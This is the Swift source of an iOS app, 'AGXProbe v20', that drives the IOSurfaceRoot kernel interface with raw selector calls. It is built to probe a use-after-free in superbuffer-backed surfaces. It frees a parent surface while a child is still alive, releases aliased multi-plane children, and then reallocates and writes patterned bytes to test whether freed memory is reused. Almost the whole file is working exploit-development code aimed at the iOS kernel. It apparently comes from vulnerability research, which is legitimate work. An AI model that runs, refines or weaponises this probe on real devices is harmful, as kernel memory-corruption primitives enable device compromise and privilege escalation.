import SwiftUI
import Darwin

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v20 — superbuffer lifetime / UAF").font(.headline)
            Text("parent release while child alive; aliased child release").font(.caption2).foregroundColor(.secondary)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v20")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false
    private let OUT_SIZE = 0xC68
    private let PF_BGRA: UInt64 = 0x42475241

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func log(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    private func xmlNul(_ d: Any) -> Data? {
        guard let data = try? PropertyListSerialization.data(fromPropertyList: d, format: .xml, options: 0) else { return nil }
        return data + Data([0])
    }

    private func stripNul(_ data: Data, tag: String) -> Data? {
        guard let s = String(data: data, encoding: .utf8) else { return nil }
        guard let a = s.range(of: "<\(tag)"),
              let b = s.range(of: "</\(tag)>", options: .backwards) else { return nil }
        return (String(s[a.lowerBound..<b.upperBound]).data(using: .utf8) ?? Data()) + Data([0])
    }

    private func num(_ v: UInt64) -> Int64 { Int64(bitPattern: v) }

    @_silgen_name("mach_vm_read_overwrite")
    private func mach_vm_read_overwrite(_ target: task_t, _ address: mach_vm_address_t,
                                        _ size: mach_vm_size_t, _ data: mach_vm_address_t,
                                        _ outsize: UnsafeMutablePointer<mach_vm_size_t>) -> kern_return_t
    @_silgen_name("mach_vm_write")
    private func mach_vm_write(_ target: task_t, _ address: mach_vm_address_t,
                               _ data: vm_offset_t, _ size: mach_msg_type_number_t) -> kern_return_t

    private func planeFull(off: UInt64, size: UInt64) -> [String: Any] {
        return [
            "IOSurfacePlaneWidth": 64,
            "IOSurfacePlaneHeight": 64,
            "IOSurfacePlaneBytesPerRow": 256,
            "IOSurfacePlaneBytesPerElement": 4,
            "IOSurfacePlaneOffset": num(off),
            "IOSurfacePlaneSize": num(size),
        ]
    }

    private func surf(_ alloc: UInt64, _ planes: [[String: Any]]) -> [String: Any] {
        return [
            "IOSurfaceWidth": 64,
            "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4,
            "IOSurfaceBytesPerRow": 256,
            "IOSurfaceAllocSize": num(alloc),
            "IOSurfacePixelFormat": PF_BGRA,
            "IOSurfacePlaneInfo": planes,
        ]
    }

    private func call(conn: io_connect_t, sel: UInt32, tag: String, scalar: UInt64,
                      scalarCount: UInt32, payload: Data, outSize: Int) -> (UInt32, [UInt8]) {
        var inScalar: [UInt64] = [scalar]
        var outScalar: [UInt64] = [0]
        var outScalarCount: UInt32 = 0
        var out = [UInt8](repeating: 0xCC, count: max(outSize, 1))
        var outLen = outSize
        let kr: kern_return_t = payload.withUnsafeBytes { raw in
            out.withUnsafeMutableBytes { ob in
                IOConnectCallMethod(conn, sel,
                                    &inScalar, scalarCount,
                                    raw.baseAddress, payload.count,
                                    &outScalar, &outScalarCount,
                                    ob.baseAddress, &outLen)
            }
        }
        let u = UInt32(bitPattern: kr)
        log(String(format: "%@ sel=%u scalar=%llu kr=0x%08x in=%lu outLen=0x%x",
                   tag, sel, scalar, u, payload.count, outLen))
        return (u, out)
    }

    private func create(conn: io_connect_t, tag: String, parent: UInt32, _ d: [String: Any]) -> (UInt32, [UInt8])? {
        guard let full = xmlNul(d), let p = stripNul(full, tag: "dict") else {
            log("\(tag): serialize failed"); return nil
        }
        let (kr, out) = call(conn: conn, sel: 0, tag: tag, scalar: UInt64(parent), scalarCount: 1, payload: p, outSize: OUT_SIZE)
        return kr == 0 ? (kr, out) : nil
    }

    private func release(conn: io_connect_t, tag: String, id: UInt32) {
        var inScalar: [UInt64] = [UInt64(id)]
        var outScalar: [UInt64] = [0]
        var outScalarCount: UInt32 = 0
        let kr = IOConnectCallScalarMethod(conn, 1, &inScalar, 1, &outScalar, &outScalarCount)
        log(String(format: "%@ release id=%u kr=0x%08x", tag, id, UInt32(bitPattern: kr)))
    }

    private func idFrom(_ out: [UInt8]) -> UInt32? {
        guard out.count >= 0x1C else { return nil }
        return UInt32(out[0x18]) | (UInt32(out[0x19]) << 8) | (UInt32(out[0x1A]) << 16) | (UInt32(out[0x1B]) << 24)
    }

    private func u64(_ out: [UInt8], _ o: Int) -> UInt64 {
        guard out.count >= o + 8 else { return 0 }
        var v: UInt64 = 0
        for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
        return v
    }

    private func safeRead(_ addr: UInt64, _ len: Int) -> [UInt8]? {
        guard addr != 0 else { return nil }
        var buf = [UInt8](repeating: 0, count: len)
        var outSz: mach_vm_size_t = 0
        let kr: kern_return_t = buf.withUnsafeMutableBytes { raw in
            mach_vm_read_overwrite(mach_task_self_, mach_vm_address_t(addr), mach_vm_size_t(len),
                                   mach_vm_address_t(UInt(bitPattern: raw.baseAddress)), &outSz)
        }
        return kr == KERN_SUCCESS ? buf : nil
    }

    private func safeWrite(_ addr: UInt64, _ val: UInt8, _ len: Int) -> Bool {
        guard addr != 0 else { return false }
        let buf = [UInt8](repeating: val, count: len)
        let kr: kern_return_t = buf.withUnsafeBytes { raw in
            mach_vm_write(mach_task_self_, mach_vm_address_t(addr),
                          vm_offset_t(UInt(bitPattern: raw.baseAddress)), mach_msg_type_number_t(len))
        }
        return kr == KERN_SUCCESS
    }

    private func probe(_ tag: String, _ addr: UInt64) {
        let r = safeRead(addr, 8)
        if let r = r {
            let v = r.enumerated().reduce(UInt64(0)) { $0 | (UInt64($1.element) << (8 * $1.offset)) }
            log(String(format: "    %@ addr=0x%llx read OK val=0x%016llx", tag, addr, v))
        } else {
            log(String(format: "    %@ addr=0x%llx read FAIL", tag, addr))
        }
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        log("=== AGXProbe v20 — superbuffer lifetime / UAF ===")

        let service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"))
        guard service != 0 else { log("IOSurfaceRoot service = NULL"); status = "Failed"; isRunning = false; return }
        defer { IOObjectRelease(service) }
        var conn: io_connect_t = 0
        let okr = IOServiceOpen(service, mach_task_self_, 0, &conn)
        log(String(format: "IOServiceOpen type=0 kr=0x%x conn=0x%x", okr, conn))
        guard okr == 0 else { status = "Failed"; isRunning = false; return }
        defer { IOServiceClose(conn) }

        // --- single plane parent/child ---
        guard let (_, po) = create(conn: conn, tag: "P parent", parent: 0, surf(0x4000, [planeFull(off: 0, size: 0x4000)])),
              let pid = idFrom(po) else { log("parent failed"); status = "Failed"; isRunning = false; return }
        let pa0 = u64(po, 0x00), pa8 = u64(po, 0x08), pa10 = u64(po, 0x10)
        log(String(format: "P id=%u a0=0x%llx a8=0x%llx a10=0x%llx", pid, pa0, pa8, pa10))

        var c1: [String: Any] = surf(0x4000, [planeFull(off: 0, size: 0x4000)])
        c1["IOSurfaceAllocateFromSuperbuffer"] = 1
        guard let (_, co) = create(conn: conn, tag: "C1 child off0", parent: pid, c1), let cid = idFrom(co) else {
            log("child failed"); status = "Failed"; isRunning = false; return
        }
        let ca0 = u64(co, 0x00), ca8 = u64(co, 0x08), ca10 = u64(co, 0x10)
        log(String(format: "C1 id=%u a0=0x%llx a8=0x%llx a10=0x%llx", cid, ca0, ca8, ca10))

        log("  write 0xAA into P a0")
        log("  P write=\(safeWrite(pa0, 0xAA, 0x1000))")
        probe("P a0", pa0)
        probe("C1 a0", ca0)
        log("  write 0xBB into C1 a0")
        log("  C1 write=\(safeWrite(ca0, 0xBB, 0x1000))")
        probe("P a0", pa0)
        probe("C1 a0", ca0)

        log("  --- release parent while child alive ---")
        release(conn: conn, tag: "P", id: pid)
        probe("P a0", pa0)
        probe("C1 a0", ca0)

        log("  --- create N after parent release ---")
        if let (_, no) = create(conn: conn, tag: "N new", parent: 0, surf(0x4000, [planeFull(off: 0, size: 0x4000)])) {
            let na0 = u64(no, 0x00)
            log(String(format: "N id=%u a0=0x%llx  (P a0=0x%llx C1 a0=0x%llx)", idFrom(no) ?? 0, na0, pa0, ca0))
            log("  write 0xCC into N a0")
            log("  N write=\(safeWrite(na0, 0xCC, 0x1000))")
            probe("N a0", na0)
            probe("C1 a0", ca0)
        }

        log("  --- release child, create M ---")
        release(conn: conn, tag: "C1", id: cid)
        probe("C1 a0", ca0)
        if let (_, mo) = create(conn: conn, tag: "M after child release", parent: 0, surf(0x4000, [planeFull(off: 0, size: 0x4000)])) {
            let ma0 = u64(mo, 0x00)
            log(String(format: "M id=%u a0=0x%llx  (C1 a0=0x%llx)", idFrom(mo) ?? 0, ma0, ca0))
            log("  write 0xDD into M a0")
            log("  M write=\(safeWrite(ma0, 0xDD, 0x1000))")
            probe("M a0", ma0)
            probe("C1 a0", ca0)
        }

        // --- 20-plane aliased child release ---
        log("  --- 20-plane aliased child ---")
        let pPlanes = (0..<20).map { planeFull(off: UInt64($0) * 0x4000, size: 0x4000) }
        if let (_, p20o) = create(conn: conn, tag: "P20", parent: 0, surf(0x50000, pPlanes)), let p20id = idFrom(p20o) {
            log(String(format: "P20 id=%u a0=0x%llx", p20id, u64(p20o, 0x00)))
            var cv: [String: Any] = surf(0x4000, (0..<20).map { _ in planeFull(off: 0, size: 0x4000) })
            cv["IOSurfaceAllocateFromSuperbuffer"] = 1
            if let (_, co20) = create(conn: conn, tag: "C20 alias", parent: p20id, cv), let c20id = idFrom(co20) {
                let c20a0 = u64(co20, 0x00)
                log(String(format: "C20 id=%u a0=0x%llx", c20id, c20a0))
                release(conn: conn, tag: "C20", id: c20id)
                probe("C20 a0 after release", c20a0)
                if let (_, co20b) = create(conn: conn, tag: "C20b alias again", parent: p20id, cv) {
                    log(String(format: "C20b id=%u a0=0x%llx (C20 was 0x%llx)", idFrom(co20b) ?? 0, u64(co20b, 0x00), c20a0))
                }
            }
        }

        log("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
